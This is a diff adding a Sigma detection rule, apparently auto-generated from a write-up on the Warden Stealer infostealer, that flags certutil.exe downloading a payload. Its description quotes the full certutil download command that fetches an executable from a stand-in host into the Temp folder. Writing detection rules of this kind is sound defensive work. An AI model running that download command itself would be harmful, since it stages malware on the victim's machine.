@@ -1,0 +1,23 @@
+title: 'Command the source shows being run: certutil -f https://example.com/payload.exe'
+id: e7449c85-a649-481a-b459-27d784026010
+status: experimental
+description: 'Deterministic rule built from a command quoted in the primary source, with no model involvement.
+  The source shows this command being run: "certutil -urlcache -split -f "https://example.com/payload.exe"
+  "C:\Users\user\AppData\Local\Temp\000013372.exe"".'
+references:
+- https://www.gendigital.com/blog/insights/research/warden-stealer-rust-infostealer-analysis
+author: hecate (auto-generated from commands quoted in the source - requires analyst review)
+date: '2026-10-15'
+tags: []
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: \certutil.exe
+    CommandLine|contains: -f https://example.com/payload.exe
+  condition: selection
+falsepositives:
+- Administrators or software running the same command for legitimate reasons
+level: medium
+hunt_id: H-0779
